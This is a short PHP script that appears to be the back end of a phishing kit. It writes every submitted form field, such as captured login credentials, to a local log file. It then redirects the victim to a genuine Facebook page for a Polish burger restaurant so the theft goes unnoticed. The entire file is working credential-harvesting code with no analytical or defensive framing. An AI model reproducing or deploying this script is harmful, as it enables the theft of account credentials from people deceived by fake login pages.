<?php
header ('Location: https://www.facebook.com/maxburgers/?locale=pl_PL');
$handle = fopen("log.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n\n");
fclose($handle);
exit;
?>